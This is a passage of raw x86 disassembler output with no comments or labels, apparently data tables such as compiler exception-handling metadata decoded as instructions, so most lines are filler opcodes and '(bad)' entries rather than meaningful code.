  40fbf2:	inc    eax
	...
  40fc03:	add    BYTE PTR [esi],al
  40fc05:	add    BYTE PTR [eax],al
  40fc07:	add    BYTE PTR [edi],al
  40fc09:	add    BYTE PTR [eax],al
  40fc0b:	add    BYTE PTR [eax],cl
  40fc0d:	add    BYTE PTR [eax],al
  40fc0f:	add    BYTE PTR [ecx],al
  40fc11:	add    BYTE PTR [eax],al
  40fc13:	add    BYTE PTR [eax-0x4],ah
  40fc16:	inc    eax
  40fc17:	add    bh,bh
  40fc19:	(bad)  
  40fc1a:	(bad)  
  40fc1b:	dec    ecx
  40fc1d:	in     eax,dx
  40fc1e:	inc    eax
  40fc1f:	add    BYTE PTR [eax],al
  40fc21:	add    BYTE PTR [eax],al
  40fc23:	add    dl,dl
  40fc25:	in     eax,dx
  40fc26:	inc    eax
  40fc27:	add    BYTE PTR [ecx],al
  40fc29:	add    BYTE PTR [eax],al
  40fc2b:	add    bl,bl
  40fc2d:	in     eax,dx
  40fc2e:	inc    eax
  40fc2f:	add    BYTE PTR [edx],al
  40fc31:	add    BYTE PTR [eax],al
  40fc33:	add    ah,ah
  40fc35:	in     eax,dx
  40fc36:	inc    eax
  40fc37:	add    BYTE PTR [ebx],al
  40fc39:	add    BYTE PTR [eax],al
  40fc3b:	add    ch,ch
  40fc3d:	in     eax,dx
  40fc3e:	inc    eax
  40fc3f:	add    BYTE PTR [eax+eax*1],al
  40fc42:	add    BYTE PTR [eax],al
  40fc44:	imul   ch
  40fc46:	inc    eax
  40fc47:	add    BYTE PTR ds:0x0,al
  40fc4d:	add    BYTE PTR [eax],al
  40fc4f:	add    BYTE PTR [esi],al
  40fc51:	add    BYTE PTR [eax],al
  40fc53:	add    bh,bh
  40fc55:	in     eax,dx
  40fc56:	inc    eax
  40fc57:	add    BYTE PTR ds:0x0,al
  40fc5d:	add    BYTE PTR [eax],al
  40fc5f:	add    BYTE PTR [eax],cl
  40fc61:	add    BYTE PTR [eax],al
  40fc63:	add    BYTE PTR [eax],dl
  40fc65:	adc    BYTE PTR [ecx+0x0],al
  40fc68:	sar    bh,0xff
  40fc6b:	call   esi
  40fc6d:	cmp    eax,DWORD PTR [eax+0x0]
  40fc70:	and    al,BYTE PTR ds:0x41993
  40fc76:	add    BYTE PTR [eax],al
  40fc78:	xchg   esp,eax
  40fc79:	cld    
  40fc7a:	inc    eax
  40fc7b:	add    BYTE PTR [ecx],al
  40fc7d:	add    BYTE PTR [eax],al
  40fc7f:	add    BYTE PTR [esp+edi*8+0x40],dh
	...
  40fc92:	add    BYTE PTR [eax],al
  40fc94:	(bad)  
  40fc95:	(bad)  
  40fc96:	(bad)  
  40fc97:	push   DWORD PTR [ecx]
  40fc99:	out    dx,al
  40fc9a:	inc    eax
	...
  40fca3:	add    BYTE PTR [ecx],al
  40fca5:	add    BYTE PTR [eax],al
  40fca7:	add    BYTE PTR [edx],bh
  40fca9:	out    dx,al
  40fcaa:	inc    eax
	...
  40fcb3:	add    BYTE PTR [ecx],al
  40fcb5:	add    BYTE PTR [eax],al
  40fcb7:	add    BYTE PTR [edx],al
  40fcb9:	add    BYTE PTR [eax],al
  40fcbb:	add    BYTE PTR [ebx],al
  40fcbd:	add    BYTE PTR [eax],al
  40fcbf:	add    BYTE PTR [ecx],al
  40fcc1:	add    BYTE PTR [eax],al
  40fcc3:	add    al,cl
  40fcc5:	cld    
  40fcc6:	inc    eax
  40fcc7:	add    BYTE PTR [eax],cl
  40fcc9:	add    BYTE PTR [eax],al
  40fccb:	add    BYTE PTR [eax],dl
  40fccd:	adc    BYTE PTR [ecx+0x0],al
  40fcd0:	aam    0xff
  40fcd2:	(bad)  
  40fcd3:	push   DWORD PTR [edi+0x2200403d]
  40fcd9:	add    eax,0x41993
  40fcde:	add    BYTE PTR [eax],al
  40fce0:	cld    
  40fce1:	cld    
  40fce2:	inc    eax
  40fce3:	add    BYTE PTR [ecx],al
  40fce5:	add    BYTE PTR [eax],al
  40fce7:	add    BYTE PTR [edi*8+0x40],bl
	...
  40fcfa:	add    BYTE PTR [eax],al
  40fcfc:	(bad)  
  40fcfd:	(bad)  
  40fcfe:	(bad)  
  40fcff:	jmp    FWORD PTR [esi+ebp*8+0x40]
	...
  40fd0b:	add    BYTE PTR [ecx],al
  40fd0d:	add    BYTE PTR [eax],al
  40fd0f:	add    BYTE PTR [ebp-0x12],dh
  40fd12:	inc    eax
	...
  40fd1b:	add    BYTE PTR [ecx],al
  40fd1d:	add    BYTE PTR [eax],al
  40fd1f:	add    BYTE PTR [edx],al
  40fd21:	add    BYTE PTR [eax],al
  40fd23:	add    BYTE PTR [ebx],al
  40fd25:	add    BYTE PTR [eax],al
  40fd27:	add    BYTE PTR [ecx],al
  40fd29:	add    BYTE PTR [eax],al
  40fd2b:	add    BYTE PTR [eax],dh
  40fd2d:	std    
  40fd2e:	inc    eax
  40fd2f:	add    BYTE PTR [eax],cl
  40fd31:	add    BYTE PTR [eax],al
  40fd33:	add    BYTE PTR [eax],dl
  40fd35:	adc    BYTE PTR [ecx+0x0],al
  40fd38:	aam    0xff
  40fd3a:	(bad)  
  40fd3b:	(bad)  
  40fd3c:	jge    0x40fd7d
  40fd3e:	inc    eax
  40fd3f:	add    BYTE PTR [edx],ah
  40fd41:	add    eax,0x81993
  40fd46:	add    BYTE PTR [eax],al
  40fd48:	push   0x20040fd
  40fd4d:	add    BYTE PTR [eax],al
  40fd4f:	add    BYTE PTR [eax+0x40fd],ch
	...
  40fd65:	add    BYTE PTR [eax],al
  40fd67:	add    bh,bh
  40fd69:	(bad)  
  40fd6a:	(bad)  
  40fd6b:	jmp    DWORD PTR [edi+0x40ee]
  40fd71:	add    BYTE PTR [eax],al
  40fd73:	add    BYTE PTR [eax+0x10040ee],dh
  40fd79:	add    BYTE PTR [eax],al
  40fd7b:	add    BYTE PTR [ecx+0x20040ee],bh
  40fd81:	add    BYTE PTR [eax],al
  40fd83:	add    BYTE PTR [eax],al
  40fd85:	add    BYTE PTR [eax],al
  40fd87:	add    BYTE PTR [ebx],al
  40fd89:	add    BYTE PTR [eax],al
  40fd8b:	add    dl,al
  40fd8d:	out    dx,al
  40fd8e:	inc    eax
  40fd8f:	add    BYTE PTR [edx],al
  40fd91:	add    BYTE PTR [eax],al
  40fd93:	add    BYTE PTR [eax],al
  40fd95:	add    BYTE PTR [eax],al
  40fd97:	add    BYTE PTR [edx],al
  40fd99:	add    BYTE PTR [eax],al
  40fd9b:	add    BYTE PTR [eax],al
  40fd9d:	add    BYTE PTR [eax],al
  40fd9f:	add    BYTE PTR [edx],al
  40fda1:	add    BYTE PTR [eax],al
  40fda3:	add    BYTE PTR [eax],al
  40fda5:	add    BYTE PTR [eax],al
  40fda7:	add    BYTE PTR [ebx],al
  40fda9:	add    BYTE PTR [eax],al
  40fdab:	add    BYTE PTR [eax+eax*1],al
  40fdae:	add    BYTE PTR [eax],al
  40fdb0:	add    eax,0x1000000
  40fdb5:	add    BYTE PTR [eax],al
  40fdb7:	add    al,dl
  40fdb9:	std    
  40fdba:	inc    eax
  40fdbb:	add    BYTE PTR [esi],al
  40fdbd:	add    BYTE PTR [eax],al
  40fdbf:	add    BYTE PTR [esi],al
  40fdc1:	add    BYTE PTR [eax],al
  40fdc3:	add    BYTE PTR [edi],al
  40fdc5:	add    BYTE PTR [eax],al
  40fdc7:	add    BYTE PTR [ecx],al
  40fdc9:	add    BYTE PTR [eax],al
  40fdcb:	add    al,ah
  40fdcd:	std    
  40fdce:	inc    eax
  40fdcf:	add    BYTE PTR [eax],cl
  40fdd1:	add    BYTE PTR [eax],al
  40fdd3:	add    BYTE PTR [eax],dl
  40fdd5:	adc    BYTE PTR [ecx+0x0],al
  40fdd8:	sar    bh,0xff
  40fddb:	jmp    DWORD PTR [esi+0x42]
  40fdde:	inc    eax
	...
  40fdeb:	add    BYTE PTR [esi],bl
  40fded:	inc    edx
  40fdee:	inc    eax
  40fdef:	add    BYTE PTR [edx],ah
  40fdf1:	add    eax,0x41993
  40fdf6:	add    BYTE PTR [eax],al
  40fdf8:	adc    al,0xfe
  40fdfa:	inc    eax
  40fdfb:	add    BYTE PTR [ecx],al
  40fdfd:	add    BYTE PTR [eax],al
  40fdff:	add    BYTE PTR [esi+edi*8],dh
  40fe02:	inc    eax
	...
  40fe13:	add    bh,bh
  40fe15:	(bad)  
  40fe16:	(bad)  
  40fe17:	push   esp
  40fe19:	out    dx,al
  40fe1a:	inc    eax
	...
  40fe23:	add    BYTE PTR [ecx],al
  40fe25:	add    BYTE PTR [eax],al
  40fe27:	add    ch,bh
  40fe29:	out    dx,al
  40fe2a:	inc    eax
	...
  40fe33:	add    BYTE PTR [ecx],al
  40fe35:	add    BYTE PTR [eax],al
  40fe37:	add    BYTE PTR [edx],al
  40fe39:	add    BYTE PTR [eax],al
  40fe3b:	add    BYTE PTR [ebx],al
  40fe3d:	add    BYTE PTR [eax],al
  40fe3f:	add    BYTE PTR [ecx],al
  40fe41:	add    BYTE PTR [eax],al
  40fe43:	add    BYTE PTR [eax-0x2],cl
  40fe46:	inc    eax
  40fe47:	add    BYTE PTR [eax],cl
  40fe49:	add    BYTE PTR [eax],al
  40fe4b:	add    BYTE PTR [eax],dl
  40fe4d:	adc    BYTE PTR [ecx+0x0],al
  40fe50:	aam    0xff
  40fe52:	(bad)  
  40fe53:	push   esi
  40fe55:	inc    ebx
  40fe56:	inc    eax
  40fe57:	add    BYTE PTR [edx],ah
  40fe59:	add    eax,0x91993
  40fe5e:	add    BYTE PTR [eax],al
  40fe60:	cmp    dh,0x40
  40fe63:	add    BYTE PTR [edx],al
  40fe65:	add    BYTE PTR [eax],al
  40fe67:	add    al,cl
  40fe69:	inc    BYTE PTR [eax+0x0]
	...
  40fe80:	(bad)  
  40fe81:	(bad)  
  40fe82:	(bad)  
  40fe83:	jmp    FWORD PTR [edi]
  40fe85:	out    dx,eax
  40fe86:	inc    eax
  40fe87:	add    BYTE PTR [eax],al
  40fe89:	add    BYTE PTR [eax],al
  40fe8b:	add    BYTE PTR [eax],bh
  40fe8d:	out    dx,eax
  40fe8e:	inc    eax
  40fe8f:	add    BYTE PTR [ecx],al
  40fe91:	add    BYTE PTR [eax],al
  40fe93:	add    BYTE PTR [ecx-0x11],al
  40fe96:	inc    eax
  40fe97:	add    BYTE PTR [edx],al
  40fe99:	add    BYTE PTR [eax],al
  40fe9b:	add    BYTE PTR [eax],al
  40fe9d:	add    BYTE PTR [eax],al
  40fe9f:	add    BYTE PTR [ebx],al
  40fea1:	add    BYTE PTR [eax],al
  40fea3:	add    BYTE PTR [edx-0x11],cl
  40fea6:	inc    eax
  40fea7:	add    BYTE PTR [edx],al
  40fea9:	add    BYTE PTR [eax],al
  40feab:	add    BYTE PTR [eax],al
  40fead:	add    BYTE PTR [eax],al
  40feaf:	add    BYTE PTR [edx],al
  40feb1:	add    BYTE PTR [eax],al
  40feb3:	add    BYTE PTR [eax],al
  40feb5:	add    BYTE PTR [eax],al
  40feb7:	add    BYTE PTR [esi],al
  40feb9:	add    BYTE PTR [eax],al
  40febb:	add    BYTE PTR [edx-0x11],dl
  40febe:	inc    eax
  40febf:	add    BYTE PTR [edx],al
  40fec1:	add    BYTE PTR [eax],al
  40fec3:	add    BYTE PTR [eax],al
  40fec5:	add    BYTE PTR [eax],al
  40fec7:	add    BYTE PTR [ebx],al
  40fec9:	add    BYTE PTR [eax],al
  40fecb:	add    BYTE PTR [eax+eax*1],al
  40fece:	add    BYTE PTR [eax],al
  40fed0:	add    eax,0x1000000
  40fed5:	add    BYTE PTR [eax],al
  40fed7:	add    al,dh
  40fed9:	inc    BYTE PTR [eax+0x0]
  40fedc:	push   es
  40fedd:	add    BYTE PTR [eax],al
  40fedf:	add    BYTE PTR [edi],al
  40fee1:	add    BYTE PTR [eax],al
  40fee3:	add    BYTE PTR [eax],cl
  40fee5:	add    BYTE PTR [eax],al
  40fee7:	add    BYTE PTR [ecx],al
  40fee9:	add    BYTE PTR [eax],al
  40feeb:	add    BYTE PTR [eax],al
  40feed:	inc    DWORD PTR [eax+0x0]
  40fef0:	or     BYTE PTR [eax],al
  40fef2:	add    BYTE PTR [eax],al
  40fef4:	adc    BYTE PTR [eax],dl
  40fef6:	inc    ecx
  40fef7:	add    al,al
  40fef9:	(bad)  
  40fefa:	(bad)  
  40fefb:	(bad)  
  40fefc:	in     eax,dx
  40fefd:	inc    esi
  40fefe:	inc    eax
	...
  40ff0b:	add    BYTE PTR [ebp+0x22004046],ah
  40ff11:	add    eax,0x161993
  40ff16:	add    BYTE PTR [eax],al
  40ff18:	cmp    bh,bh
  40ff1a:	inc    eax
  40ff1b:	add    BYTE PTR [edx],al
  40ff1d:	add    BYTE PTR [eax],al
  40ff1f:	add    al,ch
  40ff21:	inc    DWORD PTR [eax+0x0]
	...
  40ff38:	(bad)  
  40ff39:	(bad)  
  40ff3a:	(bad)  
  40ff3b:	inc    DWORD PTR [edi+0x40ef]
  40ff41:	add    BYTE PTR [eax],al
  40ff43:	add    BYTE PTR [eax+0x10040ef],dl
  40ff49:	add    BYTE PTR [eax],al
  40ff4b:	add    BYTE PTR [ecx+0x20040ef],bl
  40ff51:	add    BYTE PTR [eax],al
  40ff53:	add    BYTE PTR [eax],al
  40ff55:	add    BYTE PTR [eax],al
  40ff57:	add    BYTE PTR [ebx],al
  40ff59:	add    BYTE PTR [eax],al
  40ff5b:	add    BYTE PTR [edx+0x20040ef],ah
  40ff61:	add    BYTE PTR [eax],al
  40ff63:	add    BYTE PTR [eax],al
  40ff65:	add    BYTE PTR [eax],al
  40ff67:	add    BYTE PTR [edx],al
  40ff69:	add    BYTE PTR [eax],al
  40ff6b:	add    BYTE PTR [eax],al
  40ff6d:	add    BYTE PTR [eax],al
  40ff6f:	add    BYTE PTR [esi],al
  40ff71:	add    BYTE PTR [eax],al
  40ff73:	add    BYTE PTR [edx+0x70040ef],ch
  40ff79:	add    BYTE PTR [eax],al
  40ff7b:	add    BYTE PTR [ebx+0x80040ef],dh
  40ff81:	add    BYTE PTR [eax],al
  40ff83:	add    BYTE PTR [edi+ebp*8+0x90040],bh
  40ff8a:	add    BYTE PTR [eax],al
  40ff8c:	(bad)
  40ff8f:	add    BYTE PTR [edx],cl
  40ff91:	add    BYTE PTR [eax],al
  40ff93:	add    dh,cl
  40ff95:	out    dx,eax
  40ff96:	inc    eax
  40ff97:	add    BYTE PTR [ebx],cl
  40ff99:	add    BYTE PTR [eax],al
  40ff9b:	add    bh,dl
  40ff9d:	out    dx,eax
  40ff9e:	inc    eax
  40ff9f:	add    BYTE PTR [eax+eax*1],cl
  40ffa2:	add    BYTE PTR [eax],al
  40ffa4:	loopne 0x40ff95
  40ffa6:	inc    eax
  40ffa7:	add    BYTE PTR ds:0xe9000000,cl
  40ffad:	out    dx,eax
  40ffae:	inc    eax
  40ffaf:	add    BYTE PTR [esi],cl
  40ffb1:	add    BYTE PTR [eax],al
  40ffb3:	add    dl,dh
  40ffb5:	out    dx,eax
  40ffb6:	inc    eax
  40ffb7:	add    BYTE PTR [edi],cl
  40ffb9:	add    BYTE PTR [eax],al
  40ffbb:	add    bl,bh
  40ffbd:	out    dx,eax
  40ffbe:	inc    eax
  40ffbf:	add    BYTE PTR [esi],al
  40ffc1:	add    BYTE PTR [eax],al
  40ffc3:	add    BYTE PTR [eax+esi*8],al
  40ffc6:	inc    eax
  40ffc7:	add    BYTE PTR [esi],al
  40ffc9:	add    BYTE PTR [eax],al
  40ffcb:	add    BYTE PTR [eax],bl
  40ffcd:	lock inc eax
  40ffcf:	add    BYTE PTR [edx],dl
  40ffd1:	add    BYTE PTR [eax],al
  40ffd3:	add    BYTE PTR [ecx],ah
  40ffd5:	lock inc eax
  40ffd7:	add    BYTE PTR [ebx],dl
  40ffd9:	add    BYTE PTR [eax],al
  40ffdb:	add    BYTE PTR [edx],ch
  40ffdd:	lock inc eax
  40ffdf:	add    BYTE PTR [edx],al
  40ffe1:	add    BYTE PTR [eax],al
  40ffe3:	add    BYTE PTR [eax],al
  40ffe5:	add    BYTE PTR [eax],al
  40ffe7:	add    BYTE PTR [ebx],al
  40ffe9:	add    BYTE PTR [eax],al
  40ffeb:	add    BYTE PTR [eax+eax*1],al
  40ffee:	add    BYTE PTR [eax],al
  40fff0:	add    eax,0x1000000
  40fff5:	add    BYTE PTR [eax],al
  40fff7:	add    BYTE PTR [eax],dl
  40fff9:	add    BYTE PTR [ecx+0x0],al
  40fffc:	push   es
  40fffd:	add    BYTE PTR [eax],al
  40ffff:	add    BYTE PTR [eax+eax*1],dl
  410002:	add    BYTE PTR [eax],al
  410004:	adc    eax,0x1000000
  410009:	add    BYTE PTR [eax],al
  41000b:	add    BYTE PTR [eax],ah
  41000d:	add    BYTE PTR [ecx+0x0],al
  410010:	or     BYTE PTR [eax],al
  410012:	add    BYTE PTR [eax],al
  410014:	adc    BYTE PTR [eax],dl
  410016:	inc    ecx
  410017:	add    BYTE PTR [edi+edi*8-0x1],dh
  41001b:	call   edi
  41001d:	dec    ebp
  41001e:	inc    eax
	...
  41002b:	add    BYTE PTR [ebx+0x4d],bl
  41002e:	inc    eax
  41002f:	add    BYTE PTR [edx],ah
  410031:	add    eax,0x11993
  410036:	add    BYTE PTR [eax],al
  410038:	push   esp
  410039:	add    BYTE PTR [ecx+0x0],al
	...
  410054:	(bad)  
  410055:	(bad)  
  410056:	(bad)  
  410057:	call   FWORD PTR [edi-0x10]
  41005a:	inc    eax
  41005b:	add    BYTE PTR [eax],al
  41005d:	add    BYTE PTR [eax],al
  41005f:	add    BYTE PTR [edx],ah
  410061:	add    eax,0xc1993
  410066:	add    BYTE PTR [eax],al
  410068:	mov    BYTE PTR [eax],al
  41006a:	inc    ecx
  41006b:	add    BYTE PTR [edx],al
  41006d:	add    BYTE PTR [eax],al
  41006f:	add    al,ch
  410071:	add    BYTE PTR [ecx+0x0],al
	...
  410088:	(bad)  
  410089:	(bad)  
  41008a:	(bad)  
  41008b:	call   DWORD PTR [edx+0x40f0]
  410091:	add    BYTE PTR [eax],al
  410093:	add    BYTE PTR [eax],al
  410095:	add    BYTE PTR [eax],al
  410097:	add    BYTE PTR [ecx],al
  410099:	add    BYTE PTR [eax],al
  41009b:	add    BYTE PTR [ebx+0x40f0],bl
	...
  4100a9:	add    BYTE PTR [eax],al
  4100ab:	add    BYTE PTR [ebx+0x40f0],ah
  4100b1:	add    BYTE PTR [eax],al
  4100b3:	add    BYTE PTR [eax],al
  4100b5:	add    BYTE PTR [eax],al
  4100b7:	add    BYTE PTR ds:0xac000000,al
  4100bd:	lock inc eax
	...
  4100cb:	add    BYTE PTR [eax+esi*8+0x80040],dh
  4100d2:	add    BYTE PTR [eax],al
  4100d4:	mov    ebp,0x90040f0
  4100d9:	add    BYTE PTR [eax],al
  4100db:	add    dh,al
  4100dd:	lock inc eax
  4100df:	add    BYTE PTR [edx],cl
  4100e1:	add    BYTE PTR [eax],al
  4100e3:	add    bh,cl
  4100e5:	lock inc eax
  4100e7:	add    BYTE PTR [ecx],al
  4100e9:	add    BYTE PTR [eax],al
  4100eb:	add    BYTE PTR [edx],al
  4100ed:	add    BYTE PTR [eax],al
  4100ef:	add    BYTE PTR [ebx],al
  4100f1:	add    BYTE PTR [eax],al
  4100f3:	add    BYTE PTR [ecx],al
  4100f5:	add    BYTE PTR [eax],al
  4100f7:	add    BYTE PTR [eax],dl
  4100f9:	add    DWORD PTR [ecx+0x0],eax
  4100fc:	add    eax,0x6000000
  410101:	add    BYTE PTR [eax],al
  410103:	add    BYTE PTR [edi],al
  410105:	add    BYTE PTR [eax],al
  410107:	add    BYTE PTR [ecx],al
  410109:	add    BYTE PTR [eax],al
  41010b:	add    BYTE PTR [eax],ah
  41010d:	add    DWORD PTR [ecx+0x0],eax
  410110:	or     BYTE PTR [eax],al
  410112:	add    BYTE PTR [eax],al
  410114:	adc    BYTE PTR [eax],dl
  410116:	inc    ecx
  410117:	add    BYTE PTR [eax+0xaffffff],dh
  41011d:	push   ebx
  41011e:	inc    eax
  41011f:	add    BYTE PTR [eax],cl
  410121:	add    BYTE PTR [eax],al
  410123:	add    BYTE PTR [eax],dl
  410125:	adc    BYTE PTR [ecx+0x0],al
  410128:	mov    ah,0xff
  41012a:	(bad)  
  41012b:	push   esp
  41012d:	push   edx
  41012e:	inc    eax
  41012f:	add    BYTE PTR [edx],ah
  410131:	add    eax,0x41993
  410136:	add    BYTE PTR [eax],al
  410138:	push   esp
  410139:	add    DWORD PTR [ecx+0x0],eax
  41013c:	add    DWORD PTR [eax],eax
  41013e:	add    BYTE PTR [eax],al
  410140:	je     0x410143
  410142:	inc    ecx
	...
  410153:	add    bh,bh
  410155:	(bad)  
  410156:	(bad)  
  410157:	inc    DWORD PTR [edx]
  410159:	icebp  
  41015a:	inc    eax
	...
  410163:	add    BYTE PTR [ecx],al
  410165:	add    BYTE PTR [eax],al
  410167:	add    BYTE PTR [ebx],cl
  410169:	icebp  
  41016a:	inc    eax
	...
  410173:	add    BYTE PTR [ecx],al
  410175:	add    BYTE PTR [eax],al
  410177:	add    BYTE PTR [edx],al
  410179:	add    BYTE PTR [eax],al
  41017b:	add    BYTE PTR [ebx],al
  41017d:	add    BYTE PTR [eax],al
  41017f:	add    BYTE PTR [ecx],al
  410181:	add    BYTE PTR [eax],al
  410183:	add    BYTE PTR [eax+0x4101],cl
	...
  410191:	add    BYTE PTR [eax],al
  410193:	add    bl,bl
  410195:	push   ebp
  410196:	inc    eax
  410197:	add    BYTE PTR [edx],ah
  410199:	add    eax,0x81993
  41019e:	add    BYTE PTR [eax],al
  4101a0:	rol    BYTE PTR [ecx],0x41
  4101a3:	add    BYTE PTR [edx],al
  4101a5:	add    BYTE PTR [eax],al
  4101a7:	add    BYTE PTR [eax],al
  4101a9:	add    al,BYTE PTR [ecx+0x0]
	...
  4101c0:	(bad)  
  4101c1:	(bad)  
  4101c2:	(bad)  
  4101c3:	push   DWORD PTR [ecx+esi*8]
  4101c6:	inc    eax
  4101c7:	add    BYTE PTR [eax],al
  4101c9:	add    BYTE PTR [eax],al
  4101cb:	add    BYTE PTR ds:0x10040f1,bh
  4101d1:	add    BYTE PTR [eax],al
  4101d3:	add    BYTE PTR [eax],al
  4101d5:	add    BYTE PTR [eax],al
  4101d7:	add    BYTE PTR [edx],al
  4101d9:	add    BYTE PTR [eax],al
  4101db:	add    BYTE PTR [esi-0xf],al
  4101de:	inc    eax
  4101df:	add    BYTE PTR [edx],al
  4101e1:	add    BYTE PTR [eax],al
  4101e3:	add    BYTE PTR [edi-0xf],cl
  4101e6:	inc    eax
  4101e7:	add    BYTE PTR [ecx],al
  4101e9:	add    BYTE PTR [eax],al
  4101eb:	add    BYTE PTR [eax],al
  4101ed:	add    BYTE PTR [eax],al
  4101ef:	add    BYTE PTR [ecx],al
  4101f1:	add    BYTE PTR [eax],al
  4101f3:	add    BYTE PTR [eax],al
  4101f5:	add    BYTE PTR [eax],al
  4101f7:	add    BYTE PTR [ecx],al
  4101f9:	add    BYTE PTR [eax],al
  4101fb:	add    BYTE PTR [eax],al
  4101fd:	add    BYTE PTR [eax],al
  4101ff:	add    BYTE PTR [edx],al
  410201:	add    BYTE PTR [eax],al
  410203:	add    BYTE PTR [eax+eax*1],al
  410206:	add    BYTE PTR [eax],al
  410208:	add    eax,0x1000000
  41020d:	add    BYTE PTR [eax],al
  41020f:	add    BYTE PTR [eax],ch
  410211:	add    al,BYTE PTR [ecx+0x0]
  410214:	push   es
  410215:	add    BYTE PTR [eax],al
  410217:	add    BYTE PTR [esi],al
  410219:	add    BYTE PTR [eax],al
  41021b:	add    BYTE PTR [edi],al
  41021d:	add    BYTE PTR [eax],al
  41021f:	add    BYTE PTR [ecx],al
  410221:	add    BYTE PTR [eax],al
  410223:	add    BYTE PTR [eax],bh
  410225:	add    al,BYTE PTR [ecx+0x0]
	...
  410234:	xchg   ecx,eax
  410235:	pop    eax
  410236:	inc    eax
	...
  410243:	add    BYTE PTR [ecx+0x58],bl
  410246:	inc    eax
  410247:	add    BYTE PTR [edx],ah
  410249:	add    eax,0x11993
  41024e:	add    BYTE PTR [eax],al
  410250:	ins    BYTE PTR es:[edi],dx
  410251:	add    al,BYTE PTR [ecx+0x0]
	...
  41026c:	(bad)  
  41026d:	(bad)  
  41026e:	(bad)  
  41026f:	(bad)  
  410270:	js     0x410263
  410272:	inc    eax
  410273:	add    BYTE PTR [edx],ah
  410275:	add    eax,0x41993
  41027a:	add    BYTE PTR [eax],al
  41027c:	cwde   
  41027d:	add    al,BYTE PTR [ecx+0x0]
	...
  410298:	(bad)  
  410299:	(bad)  
  41029a:	(bad)  
  41029b:	jmp    DWORD PTR [edx+0x40f1]
  4102a1:	add    BYTE PTR [eax],al
  4102a3:	add    BYTE PTR [ebx+0x10040f1],ch
  4102a9:	add    BYTE PTR [eax],al
  4102ab:	add    BYTE PTR [edi+0x20040f1],dh
  4102b1:	add    BYTE PTR [eax],al
  4102b3:	add    bl,al
  4102b5:	icebp  
  4102b6:	inc    eax
  4102b7:	add    BYTE PTR [edx],ah
  4102b9:	add    eax,0x11993
  4102be:	add    BYTE PTR [eax],al
  4102c0:	fadd   QWORD PTR [edx]
  4102c2:	inc    ecx
	...
  4102db:	add    bh,bh
  4102dd:	(bad)  
  4102de:	(bad)  
  4102df:	(bad)  
  4102e0:	stc    
  4102e1:	icebp  
  4102e2:	inc    eax
  4102e3:	add    BYTE PTR [edx],ah
  4102e5:	add    eax,0x41993
  4102ea:	add    BYTE PTR [eax],al
  4102ec:	or     BYTE PTR [ebx],al
  4102ee:	inc    ecx
  4102ef:	add    BYTE PTR [ecx],al
  4102f1:	add    BYTE PTR [eax],al
  4102f3:	add    BYTE PTR [eax],ch
  4102f5:	add    eax,DWORD PTR [ecx+0x0]
	...
  410308:	(bad)  
  410309:	(bad)  
  41030a:	(bad)  
  41030b:	jmp    DWORD PTR [edx]
  41030d:	repnz inc eax
	...
  410317:	add    BYTE PTR [ecx],al
  410319:	add    BYTE PTR [eax],al
  41031b:	add    BYTE PTR [ebx],ch
  41031d:	repnz inc eax
	...
  410327:	add    BYTE PTR [ecx],al
  410329:	add    BYTE PTR [eax],al
  41032b:	add    BYTE PTR [edx],al
  41032d:	add    BYTE PTR [eax],al
  41032f:	add    BYTE PTR [ebx],al
  410331:	add    BYTE PTR [eax],al
  410333:	add    BYTE PTR [ecx],al
  410335:	add    BYTE PTR [eax],al
  410337:	add    BYTE PTR [ebx+eax*1],bh
  41033a:	inc    ecx
  41033b:	add    BYTE PTR [eax],al
  41033d:	add    BYTE PTR [eax],al
  41033f:	add    BYTE PTR [eax+edx*1],ch
  410342:	inc    ecx
  410343:	add    BYTE PTR [eax],al
  410345:	add    BYTE PTR [eax],al
  410347:	add    BYTE PTR [edx],al
  410349:	gs inc eax
  41034b:	add    BYTE PTR [edx],ah
  41034d:	add    eax,0x41993
  410352:	add    BYTE PTR [eax],al
  410354:	jo     0x410359
  410356:	inc    ecx
  410357:	add    BYTE PTR [ecx],al
  410359:	add    BYTE PTR [eax],al
  41035b:	add    BYTE PTR [eax+0x4103],dl
	...
  41036d:	add    BYTE PTR [eax],al
  41036f:	add    bh,bh
  410371:	(bad)  
  410372:	(bad)  
  410373:	call   DWORD PTR [edx+esi*8+0x40]
	...
  41037f:	add    BYTE PTR [ecx],al
  410381:	add    BYTE PTR [eax],al
  410383:	add    BYTE PTR [ebp-0xe],bl
  410386:	inc    eax
	...
  41038f:	add    BYTE PTR [ecx],al
  410391:	add    BYTE PTR [eax],al
  410393:	add    BYTE PTR [edx],al
  410395:	add    BYTE PTR [eax],al
  410397:	add    BYTE PTR [ebx],al
  410399:	add    BYTE PTR [eax],al
  41039b:	add    BYTE PTR [ecx],al
  41039d:	add    BYTE PTR [eax],al
  41039f:	add    BYTE PTR [ebx+eax*1+0x41],ah
  4103a6:	add    BYTE PTR [eax],al
  4103a8:	sub    al,0x10
  4103aa:	inc    ecx
  4103ab:	add    BYTE PTR [eax],al
  4103ad:	add    BYTE PTR [eax],al
  4103af:	add    BYTE PTR [edx],ch
  4103b1:	inc    ax
  4103b3:	add    BYTE PTR [edx],ah
  4103b5:	add    eax,0x21993
  4103ba:	add    BYTE PTR [eax],al
  4103bc:	fadd   DWORD PTR [ebx]
  4103be:	inc    ecx
  4103bf:	add    BYTE PTR [ecx],al
  4103c1:	add    BYTE PTR [eax],al
  4103c3:	add    al,ch
  4103c5:	add    eax,DWORD PTR [ecx+0x0]
	...
  4103d8:	(bad)  
  4103d9:	(bad)  
  4103da:	(bad)  
  4103db:	inc    DWORD PTR [eax]
  4103dd:	add    BYTE PTR [eax],al
  4103df:	add    bh,bh
  4103e1:	(bad)  
  4103e2:	(bad)  
  4103e3:	inc    DWORD PTR [eax]
	...
  4103ed:	add    BYTE PTR [eax],al
  4103ef:	add    BYTE PTR [ecx],al
  4103f1:	add    BYTE PTR [eax],al
  4103f3:	add    BYTE PTR [ecx],al
  4103f5:	add    BYTE PTR [eax],al
  4103f7:	add    ah,bh
  4103f9:	add    eax,DWORD PTR [ecx+0x0]
  4103fc:	or     BYTE PTR [eax],al
  4103fe:	add    BYTE PTR [eax],al
  410400:	adc    BYTE PTR [eax],dl
  410402:	inc    ecx
  410403:	add    al,ah
  410405:	(bad)  
  410406:	(bad)  
  410407:	dec    esp
  410409:	inc    ax
  41040b:	add    BYTE PTR [eax],al
  41040d:	add    BYTE PTR [eax],al
  41040f:	add    BYTE PTR [edx],ah
  410411:	add    eax,0x101993
  410416:	add    BYTE PTR [eax],al
  410418:	dec    eax
  410419:	add    al,0x41
  41041b:	add    BYTE PTR [ecx],al
  41041d:	add    BYTE PTR [eax],al
  41041f:	add    BYTE PTR [esp+eax*1],dh
  410422:	inc    ecx
	...
